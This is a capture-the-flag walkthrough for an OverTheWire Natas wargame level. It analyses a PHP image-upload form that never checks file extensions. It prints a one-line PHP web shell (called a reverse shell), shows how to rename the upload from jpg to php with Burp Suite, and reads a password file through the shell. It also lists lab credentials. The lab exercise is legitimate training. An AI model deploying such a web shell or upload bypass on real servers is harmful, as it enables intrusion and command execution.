# Level 11 - Level 12

```
Username: natas12
Password: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
URL:      http://natas12.natas.labs.overthewire.org
```

## Overview

This time we got an form with an option to upload images of type JPEG  with a size limit of max 1KB.

<figure><img src="../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

Also we got the link to the source code.

<figure><img src="../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

***

## Application Interaction

Before digging into the source code, I tested the functionality of the application by uploading a sample image of size 1KB.

<div>

<figure><img src="../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

 

<figure><img src="../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

</div>

But the application responded that there was some error in uploading the file. I also tried to upload an PNG image and also of images with size higher than the mentioned limit, but it responded the same.

***

## Source Code Analysis

So I started to digging the source code. Let's breakdown the file upload process:

First, a random file name is generated during form submission with a  hard  coded extension `.jpg`.

<figure><img src="../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

Next, the `makeRandomPathFromFilename` function is triggered, which takes the directory name and the file name as an input. In our case the directory name is hard coded as `upload` and the file name is randomly generated by the `genRandomString` function. The value of the filename is retrieved from the incoming request data.

<div>

<figure><img src="../.gitbook/assets/image (95).png" alt="" width="375"><figcaption></figcaption></figure>

 

<figure><img src="../.gitbook/assets/image (96).png" alt="" width="373"><figcaption></figcaption></figure>

</div>

The `makeRandomPathFromFilename` function extracts the extension from the filename and passes it to another function `makeRandomPath`, which again generates a random filename using `genRandomString` function and appends it with the base directory and the extension, then checks whether the generated path already exists. If the generated path already exists, it again generates a new path else it returns the path.

<figure><img src="../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

After the successful generation of the target\_path, the file size limit is verified and also it verifies that the file is successfully moved to another location successfully using the `move_uploaded_file` php function.

<figure><img src="../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

***

## Getting the Password

We can see that there is no validation is performed on the input file type or extension, so I tried to upload a simple php reverse shell:

```php
// rev.php
<?php system($_REQUEST['cmd']); ?>
```

<div>

<figure><img src="../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

 

<figure><img src="../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

</div>

The file was successfully uploaded, but the file extension has been modified since its hard coded in the code. We can change this by intercepting the upload request via burpsuite and change the extension from jpg to php.

<figure><img src="../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

The reverse shell was successfully uploaded with the extension php. Now let's try to execute commands via our reverse shell.

<figure><img src="../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

The reverse shell is working. Now let's retrieve the password by viewing the contents of `/etc/natas_webpass/natas13`.&#x20;

<figure><img src="../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>
